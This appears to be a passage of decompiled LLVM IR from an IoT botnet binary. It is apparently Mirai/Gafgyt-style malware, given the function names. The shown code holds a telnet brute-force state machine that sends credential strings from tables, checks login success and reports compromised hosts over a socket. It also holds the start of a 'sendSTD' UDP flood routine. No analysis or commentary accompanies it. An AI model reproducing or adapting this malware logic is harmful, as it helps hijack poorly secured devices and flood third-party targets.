  %v0_d734 = load i32, i32* %ip.global-to-local, align 4
  %v4_d740 = inttoptr i32 %v2_d728 to i8*
  %v5_d740 = call i32 @read_until_response(i32 %v0_d734, i32 %arg1, i8* %v4_d740, i32 1024)
  %v2_d748 = icmp eq i32 %v5_d740, 0
  br i1 %v2_d748, label %dec_label_pc_d7d8, label %dec_label_pc_d750

dec_label_pc_d750:                                ; preds = %dec_label_pc_d6ec
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v2_d76c = add i32 %v2_cf68, 24
  %v1_d770 = inttoptr i32 %v2_d76c to i32*
  %v2_d770 = load i32, i32* %v1_d770, align 4
  %v1_d778 = call i32 @contains_fail(i32 %v2_d770)
  %v2_d780 = icmp eq i32 %v1_d778, 0
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  br i1 %v2_d780, label %dec_label_pc_d7b0, label %dec_label_pc_d788

dec_label_pc_d788:                                ; preds = %dec_label_pc_d750
  %v3_d7a8 = call i32 @advance_state(i32* %v1_d704, i32 0)
  br label %dec_label_pc_e0a0

dec_label_pc_d7b0:                                ; preds = %dec_label_pc_d750
  %v3_d7d0 = call i32 @advance_state(i32* %v1_d704, i32 3)
  br label %dec_label_pc_e0a0

dec_label_pc_d7d8:                                ; preds = %dec_label_pc_d6ec
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v2_d7f8 = load i32, i32* %v1_cf70, align 4
  %v1_d7fc = add i32 %v2_d7f8, 7
  store i32 %v1_d7fc, i32* @r4, align 4
  %v2_d804 = call i32 @__GI_time(i32* null)
  %v0_d80c = load i32, i32* @r4, align 4
  %v3_d80c = icmp ult i32 %v0_d80c, %v2_d804
  br i1 %v3_d80c, label %dec_label_pc_d814, label %dec_label_pc_e0a0

dec_label_pc_d814:                                ; preds = %dec_label_pc_d7d8
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v3_d830 = call i32 @reset_telstate(i32 %v2_cf68, i32 %v3_ce44, i32 %v3_cf5c)
  br label %dec_label_pc_e0a0

dec_label_pc_d838:                                ; preds = %dec_label_pc_cfb4
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v1_d850 = inttoptr i32 %v2_cf68 to i32*
  %v2_d850 = load i32, i32* %v1_d850, align 4
  store i32 %v2_d850, i32* @r4, align 4
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v1_d874 = add i32 %v2_cf68, 10
  %v2_d874 = inttoptr i32 %v1_d874 to i8*
  %v3_d874 = load i8, i8* %v2_d874, align 2
  %v4_d874 = zext i8 %v3_d874 to i32
  store i32 %v4_d874, i32* %r2.global-to-local, align 4
  %v4_d880 = mul nuw nsw i32 %v4_d874, 4
  %v5_d880 = add i32 %v4_d880, ptrtoint ([6 x i8*]* @global_var_281f8.336 to i32)
  %v6_d880 = inttoptr i32 %v5_d880 to i32*
  %v7_d880 = load i32, i32* %v6_d880, align 4
  store i32 %v7_d880, i32* @r5, align 4
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v3_d8a4 = load i8, i8* %v2_d874, align 2
  %v4_d8a4 = zext i8 %v3_d8a4 to i32
  store i32 %v4_d8a4, i32* %r2.global-to-local, align 4
  %v4_d8b0 = mul nuw nsw i32 %v4_d8a4, 4
  %v5_d8b0 = add i32 %v4_d8b0, ptrtoint ([6 x i8*]* @global_var_281f8.336 to i32)
  %v6_d8b0 = inttoptr i32 %v5_d8b0 to i32*
  %v7_d8b0 = load i32, i32* %v6_d8b0, align 4
  %v1_d8b4 = inttoptr i32 %v7_d8b0 to i8*
  %v3_d8b8 = call i32 @strlen(i8* %v1_d8b4)
  %v0_d8c0 = load i32, i32* @r4, align 4
  %v0_d8c4 = load i32, i32* @r5, align 4
  store i32 %v3_d8b8, i32* %r2.global-to-local, align 4
  %v4_d8d0 = call i32 @__libc_send(i32 %v0_d8c0, i32 %v0_d8c4, i32 %v3_d8b8, i32 16384)
  %v1_d8d8 = icmp slt i32 %v4_d8d0, 0
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  br i1 %v1_d8d8, label %dec_label_pc_d8e0, label %dec_label_pc_d904

dec_label_pc_d8e0:                                ; preds = %dec_label_pc_d838
  %v3_d8fc = call i32 @reset_telstate(i32 %v2_cf68, i32 %v3_ce44, i32 %v3_cf5c)
  br label %dec_label_pc_e0a0

dec_label_pc_d904:                                ; preds = %dec_label_pc_d838
  %v2_d91c = load i32, i32* %v1_d850, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_d930 = call i32 @__libc_send(i32 %v2_d91c, i32 ptrtoint ([3 x i8]* @global_var_1e5d4.338 to i32), i32 2, i32 16384)
  %v1_d938 = icmp slt i32 %v5_d930, 0
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  br i1 %v1_d938, label %dec_label_pc_d940, label %dec_label_pc_d964

dec_label_pc_d940:                                ; preds = %dec_label_pc_d904
  %v3_d95c = call i32 @reset_telstate(i32 %v2_cf68, i32 %v3_ce44, i32 %v3_cf5c)
  br label %dec_label_pc_e0a0

dec_label_pc_d964:                                ; preds = %dec_label_pc_d904
  %v3_d984 = call i32 @advance_state(i32* nonnull %v1_d850, i32 4)
  br label %dec_label_pc_e0a0

dec_label_pc_d98c:                                ; preds = %dec_label_pc_cfb4
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v1_d9a4 = inttoptr i32 %v2_cf68 to i32*
  %v2_d9a4 = load i32, i32* %v1_d9a4, align 4
  store i32 %v2_d9a4, i32* %ip.global-to-local, align 4
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v2_d9c4 = add i32 %v2_cf64, %v2_d720
  %v1_d9c8 = inttoptr i32 %v2_d9c4 to i32*
  %v2_d9c8 = load i32, i32* %v1_d9c8, align 4
  store i32 %v2_d9c8, i32* %r2.global-to-local, align 4
  %v1_d9d0 = load i32, i32* @sp, align 4
  %v2_d9d0 = inttoptr i32 %v1_d9d0 to i32*
  store i32 ptrtoint (i32* @global_var_2823c to i32), i32* %v2_d9d0, align 4
  %v0_d9d4 = load i32, i32* %ip.global-to-local, align 4
  %v4_d9e0 = inttoptr i32 %v2_d9c8 to i8*
  %v5_d9e0 = call i32 @read_until_response(i32 %v0_d9d4, i32 %arg1, i8* %v4_d9e0, i32 1024)
  %v2_d9e8 = icmp eq i32 %v5_d9e0, 0
  br i1 %v2_d9e8, label %dec_label_pc_da78, label %dec_label_pc_d9f0

dec_label_pc_d9f0:                                ; preds = %dec_label_pc_d98c
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v2_da0c = add i32 %v2_cf68, 24
  %v1_da10 = inttoptr i32 %v2_da0c to i32*
  %v2_da10 = load i32, i32* %v1_da10, align 4
  %v1_da18 = call i32 @contains_fail(i32 %v2_da10)
  %v2_da20 = icmp eq i32 %v1_da18, 0
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  br i1 %v2_da20, label %dec_label_pc_da50, label %dec_label_pc_da28

dec_label_pc_da28:                                ; preds = %dec_label_pc_d9f0
  %v3_da48 = call i32 @advance_state(i32* %v1_d9a4, i32 0)
  br label %dec_label_pc_e0a0

dec_label_pc_da50:                                ; preds = %dec_label_pc_d9f0
  %v3_da70 = call i32 @advance_state(i32* %v1_d9a4, i32 5)
  br label %dec_label_pc_e0a0

dec_label_pc_da78:                                ; preds = %dec_label_pc_d98c
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v2_da98 = load i32, i32* %v1_cf70, align 4
  %v1_da9c = add i32 %v2_da98, 3
  store i32 %v1_da9c, i32* @r4, align 4
  %v2_daa4 = call i32 @__GI_time(i32* null)
  %v0_daac = load i32, i32* @r4, align 4
  %v3_daac = icmp ult i32 %v0_daac, %v2_daa4
  br i1 %v3_daac, label %dec_label_pc_dab4, label %dec_label_pc_e0a0

dec_label_pc_dab4:                                ; preds = %dec_label_pc_da78
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v3_dad0 = call i32 @reset_telstate(i32 %v2_cf68, i32 %v3_ce44, i32 %v3_cf5c)
  br label %dec_label_pc_e0a0

dec_label_pc_dad8:                                ; preds = %dec_label_pc_cfb4
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v1_daf0 = inttoptr i32 %v2_cf68 to i32*
  %v2_daf0 = load i32, i32* %v1_daf0, align 4
  store i32 %v2_daf0, i32* @r4, align 4
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v1_db14 = add i32 %v2_cf68, 11
  %v2_db14 = inttoptr i32 %v1_db14 to i8*
  %v3_db14 = load i8, i8* %v2_db14, align 1
  %v4_db14 = zext i8 %v3_db14 to i32
  store i32 %v4_db14, i32* %r2.global-to-local, align 4
  %v4_db20 = mul nuw nsw i32 %v4_db14, 4
  %v5_db20 = add i32 %v4_db20, ptrtoint ([3 x i8*]* @global_var_28204.340 to i32)
  %v6_db20 = inttoptr i32 %v5_db20 to i32*
  %v7_db20 = load i32, i32* %v6_db20, align 4
  store i32 %v7_db20, i32* @r5, align 4
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v3_db44 = load i8, i8* %v2_db14, align 1
  %v4_db44 = zext i8 %v3_db44 to i32
  store i32 %v4_db44, i32* %r2.global-to-local, align 4
  %v4_db50 = mul nuw nsw i32 %v4_db44, 4
  %v5_db50 = add i32 %v4_db50, ptrtoint ([3 x i8*]* @global_var_28204.340 to i32)
  %v6_db50 = inttoptr i32 %v5_db50 to i32*
  %v7_db50 = load i32, i32* %v6_db50, align 4
  %v1_db54 = inttoptr i32 %v7_db50 to i8*
  %v3_db58 = call i32 @strlen(i8* %v1_db54)
  %v0_db60 = load i32, i32* @r4, align 4
  %v0_db64 = load i32, i32* @r5, align 4
  store i32 %v3_db58, i32* %r2.global-to-local, align 4
  %v4_db70 = call i32 @__libc_send(i32 %v0_db60, i32 %v0_db64, i32 %v3_db58, i32 16384)
  %v1_db78 = icmp slt i32 %v4_db70, 0
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  br i1 %v1_db78, label %dec_label_pc_db80, label %dec_label_pc_dba4

dec_label_pc_db80:                                ; preds = %dec_label_pc_dad8
  %v3_db9c = call i32 @reset_telstate(i32 %v2_cf68, i32 %v3_ce44, i32 %v3_cf5c)
  br label %dec_label_pc_e0a0

dec_label_pc_dba4:                                ; preds = %dec_label_pc_dad8
  %v2_dbbc = load i32, i32* %v1_daf0, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v5_dbd0 = call i32 @__libc_send(i32 %v2_dbbc, i32 ptrtoint ([3 x i8]* @global_var_1e5d4.338 to i32), i32 2, i32 16384)
  %v1_dbd8 = icmp slt i32 %v5_dbd0, 0
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  br i1 %v1_dbd8, label %dec_label_pc_dbe0, label %dec_label_pc_dc04

dec_label_pc_dbe0:                                ; preds = %dec_label_pc_dba4
  %v3_dbfc = call i32 @reset_telstate(i32 %v2_cf68, i32 %v3_ce44, i32 %v3_cf5c)
  br label %dec_label_pc_e0a0

dec_label_pc_dc04:                                ; preds = %dec_label_pc_dba4
  %v3_dc24 = call i32 @advance_state(i32* nonnull %v1_daf0, i32 6)
  br label %dec_label_pc_e0a0

dec_label_pc_dc2c:                                ; preds = %dec_label_pc_cfb4
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v1_dc44 = inttoptr i32 %v2_cf68 to i32*
  %v2_dc44 = load i32, i32* %v1_dc44, align 4
  store i32 %v2_dc44, i32* %ip.global-to-local, align 4
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v2_dc64 = add i32 %v2_cf64, %v2_d720
  %v1_dc68 = inttoptr i32 %v2_dc64 to i32*
  %v2_dc68 = load i32, i32* %v1_dc68, align 4
  store i32 %v2_dc68, i32* %r2.global-to-local, align 4
  %v1_dc70 = load i32, i32* @sp, align 4
  %v2_dc70 = inttoptr i32 %v1_dc70 to i32*
  store i32 ptrtoint ([10 x i8*]* @global_var_28280.342 to i32), i32* %v2_dc70, align 4
  %v0_dc74 = load i32, i32* %ip.global-to-local, align 4
  %v4_dc80 = inttoptr i32 %v2_dc68 to i8*
  %v5_dc80 = call i32 @read_until_response(i32 %v0_dc74, i32 %arg1, i8* %v4_dc80, i32 1024)
  %v2_dc88 = icmp eq i32 %v5_dc80, 0
  br i1 %v2_dc88, label %dec_label_pc_dea4, label %dec_label_pc_dc90

dec_label_pc_dc90:                                ; preds = %dec_label_pc_dc2c
  store i32 %storemerge548, i32* @r4, align 4
  %v2_dc98 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_dcac = load i32, i32* @r4, align 4
  %v2_dcb8 = mul i32 %v0_dcac, 28
  %v2_dcc0 = add i32 %v2_d6a4, %v2_dcb8
  %v2_dcc4 = inttoptr i32 %v2_dcc0 to i32*
  store i32 %v2_dc98, i32* %v2_dcc4, align 4
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v2_dce8 = load i32, i32* %v1_dc68, align 4
  %v1_dcf0 = call i32 @contains_fail(i32 %v2_dce8)
  %v2_dcf8 = icmp eq i32 %v1_dcf0, 0
  br i1 %v2_dcf8, label %dec_label_pc_dd28, label %dec_label_pc_dd00

dec_label_pc_dd00:                                ; preds = %dec_label_pc_dc90
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v3_dd20 = call i32 @advance_state(i32* %v1_dc44, i32 0)
  br label %dec_label_pc_e0a0

dec_label_pc_dd28:                                ; preds = %dec_label_pc_dc90
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v2_dd48 = load i32, i32* %v1_dc68, align 4
  %v1_dd50 = call i32 @contains_success(i32 %v2_dd48)
  %v2_dd58 = icmp eq i32 %v1_dd50, 0
  br i1 %v2_dd58, label %dec_label_pc_de80, label %dec_label_pc_dd60

dec_label_pc_dd60:                                ; preds = %dec_label_pc_dd28
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v1_dd80 = add i32 %v2_cf68, 9
  %v2_dd80 = inttoptr i32 %v1_dd80 to i8*
  %v3_dd80 = load i8, i8* %v2_dd80, align 1
  %v7_dd84 = icmp eq i8 %v3_dd80, 2
  br i1 %v7_dd84, label %dec_label_pc_dd8c, label %dec_label_pc_ddb4

dec_label_pc_dd8c:                                ; preds = %dec_label_pc_dd60
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v3_ddac = call i32 @advance_state(i32* %v1_dc44, i32 7)
  br label %dec_label_pc_e0a0

dec_label_pc_ddb4:                                ; preds = %dec_label_pc_dd60
  %v2_ddb8 = load i32, i32* @global_var_28570.50, align 4
  store i32 %v2_ddb8, i32* @r4, align 4
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v3_ddd8 = call i32 @get_telstate_host(i32 %v2_cf68, i32 %v3_ce44, i32 %v3_cf5c)
  store i32 %v3_ddd8, i32* %ip.global-to-local, align 4
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v1_de00 = add i32 %v2_cf68, 10
  %v2_de00 = inttoptr i32 %v1_de00 to i8*
  %v3_de00 = load i8, i8* %v2_de00, align 2
  %v4_de00 = zext i8 %v3_de00 to i32
  store i32 %v4_de00, i32* %r2.global-to-local, align 4
  %v4_de0c = mul nuw nsw i32 %v4_de00, 4
  %v5_de0c = add i32 %v4_de0c, ptrtoint ([6 x i8*]* @global_var_281f8.336 to i32)
  %v6_de0c = inttoptr i32 %v5_de0c to i32*
  %v7_de0c = load i32, i32* %v6_de0c, align 4
  store i32 %v7_de0c, i32* @lr, align 4
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v1_de30 = add i32 %v2_cf68, 11
  %v2_de30 = inttoptr i32 %v1_de30 to i8*
  %v3_de30 = load i8, i8* %v2_de30, align 1
  %v4_de30 = zext i8 %v3_de30 to i32
  store i32 %v4_de30, i32* %r2.global-to-local, align 4
  %v4_de3c = mul nuw nsw i32 %v4_de30, 4
  %v5_de3c = add i32 %v4_de3c, ptrtoint ([3 x i8*]* @global_var_28204.340 to i32)
  %v6_de3c = inttoptr i32 %v5_de3c to i32*
  %v7_de3c = load i32, i32* %v6_de3c, align 4
  %v1_de40 = load i32, i32* @sp, align 4
  %v2_de40 = inttoptr i32 %v1_de40 to i32*
  store i32 %v7_de3c, i32* %v2_de40, align 4
  %v0_de44 = load i32, i32* @r4, align 4
  %v0_de4c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v0_de4c, i32* @r2, align 4
  %v3_de54 = call i32 @sockprintf(i32 %v0_de44, i32 ptrtoint ([23 x i8]* @global_var_1e5d8.345 to i32))
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v3_de78 = call i32 @advance_state(i32* %v1_dc44, i32 7)
  br label %dec_label_pc_e0a0

dec_label_pc_de80:                                ; preds = %dec_label_pc_dd28
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v3_de9c = call i32 @reset_telstate(i32 %v2_cf68, i32 %v3_ce44, i32 %v3_cf5c)
  br label %dec_label_pc_e0a0

dec_label_pc_dea4:                                ; preds = %dec_label_pc_dc2c
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v2_dec0 = add i32 %v2_cf64, %v2_d6a4
  %v1_dec4 = inttoptr i32 %v2_dec0 to i32*
  %v2_dec4 = load i32, i32* %v1_dec4, align 4
  %v1_dec8 = add i32 %v2_dec4, 7
  store i32 %v1_dec8, i32* @r4, align 4
  %v2_ded0 = call i32 @__GI_time(i32* null)
  %v0_ded8 = load i32, i32* @r4, align 4
  %v3_ded8 = icmp ult i32 %v0_ded8, %v2_ded0
  br i1 %v3_ded8, label %dec_label_pc_dee0, label %dec_label_pc_e0a0

dec_label_pc_dee0:                                ; preds = %dec_label_pc_dea4
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v3_defc = call i32 @reset_telstate(i32 %v2_cf68, i32 %v3_ce44, i32 %v3_cf5c)
  br label %dec_label_pc_e0a0

dec_label_pc_df30:                                ; preds = %dec_label_pc_cfb4
  store i32 %storemerge548, i32* @r4, align 4
  %v2_df38 = call i32 @__GI_time(i32* null)
  store i32 16, i32* %ip.global-to-local, align 4
  %v0_df4c = load i32, i32* @r4, align 4
  %v2_df58 = mul i32 %v0_df4c, 28
  %v2_df60 = add i32 %v2_d6a4, %v2_df58
  %v2_df64 = inttoptr i32 %v2_df60 to i32*
  store i32 %v2_df38, i32* %v2_df64, align 4
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v1_df80 = inttoptr i32 %v2_cf68 to i32*
  %v2_df80 = load i32, i32* %v1_df80, align 4
  store i32 4, i32* %r2.global-to-local, align 4
  %v5_df94 = call i32 @__libc_send(i32 %v2_df80, i32 ptrtoint ([5 x i8]* @global_var_1e5f0.347 to i32), i32 4, i32 16384)
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v2_dfb0 = load i32, i32* %v1_df80, align 4
  store i32 7, i32* %r2.global-to-local, align 4
  %v5_dfc4 = call i32 @__libc_send(i32 %v2_dfb0, i32 ptrtoint ([8 x i8]* @global_var_1e5f8.349 to i32), i32 7, i32 16384)
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v2_dfe0 = load i32, i32* %v1_df80, align 4
  store i32 %v2_dfe0, i32* @r4, align 4
  %v2_dfe8 = load i32, i32* bitcast ([504 x i8]** @global_var_281f4.352 to i32*), align 4
  store i32 %v2_dfe8, i32* @r5, align 4
  %v1_dff4 = inttoptr i32 %v2_dfe8 to i8*
  %v3_dff8 = call i32 @strlen(i8* %v1_dff4)
  %v0_e000 = load i32, i32* @r4, align 4
  %v0_e004 = load i32, i32* @r5, align 4
  store i32 %v3_dff8, i32* %r2.global-to-local, align 4
  %v5_e010 = call i32 @__libc_send(i32 %v0_e000, i32 %v0_e004, i32 %v3_dff8, i32 16384)
  %v1_e018 = icmp slt i32 %v5_e010, 0
  br i1 %v1_e018, label %dec_label_pc_e020, label %dec_label_pc_e044

dec_label_pc_e020:                                ; preds = %dec_label_pc_df30
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v3_e03c = call i32 @reset_telstate(i32 %v2_cf68, i32 %v3_ce44, i32 %v3_cf5c)
  br label %dec_label_pc_e0a0

dec_label_pc_e044:                                ; preds = %dec_label_pc_df30
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v2_e060 = add i32 %v2_cf64, %v2_d6a4
  %v1_e064 = inttoptr i32 %v2_e060 to i32*
  %v2_e064 = load i32, i32* %v1_e064, align 4
  %v1_e068 = add i32 %v2_e064, 25
  store i32 %v1_e068, i32* @r4, align 4
  %v2_e070 = call i32 @__GI_time(i32* null)
  %v0_e078 = load i32, i32* @r4, align 4
  %v3_e078 = icmp ult i32 %v0_e078, %v2_e070
  br i1 %v3_e078, label %dec_label_pc_e080, label %dec_label_pc_e0a0

dec_label_pc_e080:                                ; preds = %dec_label_pc_e044
  store i32 %v3_cf5c, i32* %r2.global-to-local, align 4
  %v3_e09c = call i32 @reset_telstate(i32 %v2_cf68, i32 %v3_ce44, i32 %v3_cf5c)
  br label %dec_label_pc_e0a0

dec_label_pc_e0a0:                                ; preds = %dec_label_pc_d68c, %dec_label_pc_d7d8, %dec_label_pc_da78, %dec_label_pc_dea4, %dec_label_pc_e044, %dec_label_pc_cfb4, %dec_label_pc_d268, %dec_label_pc_e020, %dec_label_pc_dee0, %dec_label_pc_de80, %dec_label_pc_ddb4, %dec_label_pc_dd8c, %dec_label_pc_dd00, %dec_label_pc_dc04, %dec_label_pc_dbe0, %dec_label_pc_db80, %dec_label_pc_dab4, %dec_label_pc_da50, %dec_label_pc_da28, %dec_label_pc_d964, %dec_label_pc_d940, %dec_label_pc_d8e0, %dec_label_pc_d814, %dec_label_pc_d7b0, %dec_label_pc_d788, %dec_label_pc_d6c8, %dec_label_pc_d668, %dec_label_pc_d5d4, %dec_label_pc_d5b0, %dec_label_pc_d404, %dec_label_pc_d3e0, %dec_label_pc_d23c, %dec_label_pc_d1e4, %dec_label_pc_e080
  %v1_e0a4 = add nuw nsw i32 %storemerge548, 1
  store i32 %v1_e0a4, i32* %r2.global-to-local, align 4
  %v5_e0b8 = icmp slt i32 %v1_e0a4, %arg2
  br i1 %v5_e0b8, label %dec_label_pc_cf50, label %dec_label_pc_cf44

; uselistorder directives
  uselistorder i32 %v1_e0a4, { 2, 1, 0 }
  uselistorder i32 %v3_dff8, { 1, 0 }
  uselistorder i32* %v1_dc44, { 1, 0, 2, 3 }
  uselistorder i32 %v3_db58, { 1, 0 }
  uselistorder i32 %v3_d8b8, { 1, 0 }
  uselistorder i32 %storemerge610, { 1, 0 }
  uselistorder i32 %v0_d0bc, { 1, 0 }
  uselistorder i32 %v2_d050, { 1, 0 }
  uselistorder i32 %v2_d04c, { 1, 0, 2 }
  uselistorder i8* %v2_d024, { 2, 1, 0, 3 }
  uselistorder i32 %v0_cf98, { 1, 0 }
  uselistorder i32* %v1_cf70, { 1, 0, 2 }
  uselistorder i32 %v2_cf68, { 35, 34, 36, 27, 28, 29, 30, 31, 32, 33, 24, 23, 25, 26, 21, 4, 22, 18, 17, 19, 20, 15, 3, 16, 13, 12, 11, 14, 6, 7, 1, 2, 8, 0, 10, 9, 5 }
  uselistorder i32 %v2_cf64, { 0, 1, 2, 3, 4, 5, 7, 6 }
  uselistorder i32 %v3_cf5c, { 81, 82, 80, 78, 79, 77, 76, 75, 61, 62, 60, 65, 66, 73, 72, 71, 69, 70, 68, 67, 64, 74, 63, 59, 58, 56, 57, 54, 55, 53, 52, 51, 47, 48, 46, 50, 49, 45, 44, 42, 43, 40, 41, 39, 38, 37, 33, 34, 32, 36, 35, 31, 30, 28, 29, 27, 25, 26, 23, 22, 24, 21, 20, 19, 18, 17, 11, 9, 10, 8, 7, 6, 5, 4, 16, 15, 14, 13, 12, 3, 2, 1, 0 }
  uselistorder i32 %storemerge548, { 1, 4, 5, 7, 6, 3, 2, 0 }
  uselistorder i32 %v2_d6a4, { 3, 0, 4, 1, 5, 2 }
  uselistorder i32 %v2_d42c, { 3, 2, 4, 0, 1 }
  uselistorder i32 %v1_cf28, { 1, 2, 0 }
  uselistorder i32 %v1_cf04, { 2, 1, 0 }
  uselistorder i32 %storemerge457, { 1, 0 }
  uselistorder i32 %v3_ce44, { 4, 3, 5, 6, 7, 9, 8, 10, 12, 11, 13, 16, 15, 14, 18, 0, 19, 17, 1, 22, 23, 24, 21, 2, 20 }
  uselistorder i32* %stack_var_-24, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32* %stack_var_-612, { 0, 2, 1 }
  uselistorder i32* %stack_var_-340, { 1, 0, 2, 3 }
  uselistorder i32* %r2.global-to-local, { 104, 0, 1, 2, 3, 4, 5, 6, 8, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 108, 105, 106, 109, 107 }
  uselistorder i32 (i32)* @contains_success, { 1, 0 }
  uselistorder i32 35, { 1, 0 }
  uselistorder i32 ptrtoint ([3 x i8*]* @global_var_28204.340 to i32), { 2, 0, 1 }
  uselistorder i32 ptrtoint ([3 x i8]* @global_var_1e5d4.338 to i32), { 1, 0 }
  uselistorder i32 ptrtoint ([6 x i8*]* @global_var_281f8.336 to i32), { 2, 0, 1 }
  uselistorder i32 (i32)* @contains_fail, { 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @getsockopt, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @__libc_select, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @reset_telstate, { 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 115, { 1, 0, 2 }
  uselistorder i32 %arg2, { 2, 3, 0, 1, 4 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_e0a0, { 33, 4, 7, 8, 3, 9, 10, 11, 12, 13, 14, 15, 16, 2, 17, 18, 19, 20, 21, 22, 1, 23, 24, 25, 0, 26, 27, 28, 29, 30, 6, 31, 32, 5 }
  uselistorder label %dec_label_pc_d440, { 1, 0 }
  uselistorder label %dec_label_pc_d404, { 1, 0 }
  uselistorder label %dec_label_pc_cfb4, { 1, 0 }
  uselistorder label %dec_label_pc_cf50, { 1, 0 }
  uselistorder label %dec_label_pc_cf44, { 1, 0, 2 }
  uselistorder label %dec_label_pc_ce88, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-196 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_e0c4 = load i32, i32* @fp, align 4
  store i32 %v3_e0c4, i32* %stack_var_-16, align 4
  store i32 57548, i32* %stack_var_-4, align 4
  %v13_e0c4 = ptrtoint i32* %stack_var_-16 to i32
  %v2_e0c8 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_e0c8, i32* @fp, align 4
  %v3_e0e8 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_e0f8 = call i32 @__GI_time(i32* null)
  store i32 %arg1, i32* @r0, align 4
  %v1_e10c = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_e118 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v2_e118, i32* @r0, align 4
  %v2_e124 = call i32 @bzero(i32 %v2_e118, i32 16)
  %v1_e12c = add i32 %v1_e10c, 16
  %v2_e12c = inttoptr i32 %v1_e12c to i32*
  %v3_e12c = load i32, i32* %v2_e12c, align 4
  %v1_e130 = inttoptr i32 %v3_e12c to i32*
  %v2_e130 = load i32, i32* %v1_e130, align 4
  %v1_e138 = add i32 %v1_e10c, 12
  %v2_e138 = inttoptr i32 %v1_e138 to i32*
  %v3_e138 = load i32, i32* %v2_e138, align 4
  store i32 %v3_e138, i32* @r2, align 4
  %v2_e144 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_e144, i32* @r3, align 4
  %v5_e150 = call i32 @bcopy(i32 %v2_e130, i32 %v2_e144, i32 %v3_e138, i32 %v2_e144, i32 ptrtoint (i32* @0 to i32))
  %v1_e158 = add i32 %v1_e10c, 8
  %v2_e158 = inttoptr i32 %v1_e158 to i32*
  %v3_e158 = load i32, i32* %v2_e158, align 4
  %v3_e160 = urem i32 %v3_e158, 65536
  store i32 %v3_e160, i32* %stack_var_-52, align 4
  %v2_e184 = ptrtoint i32* %stack_var_-196 to i32
  %v2_e238 = add i32 %v2_e0f8, %arg3
  %v2_e1e0 = add i32 %v13_e0c4, -180
  br label %dec_label_pc_e180

dec_label_pc_e180:                                ; preds = %dec_label_pc_e25c, %entry
  %storemerge7 = phi i32 [ 0, %entry ], [ %v1_e260, %dec_label_pc_e25c ]
  store i32 ptrtoint ([36 x i8*]* @global_var_1e7a4.390 to i32), i32* @r3, align 4
  store i32 144, i32* @ip, align 4
  store i32 %v2_e184, i32* @r0, align 4
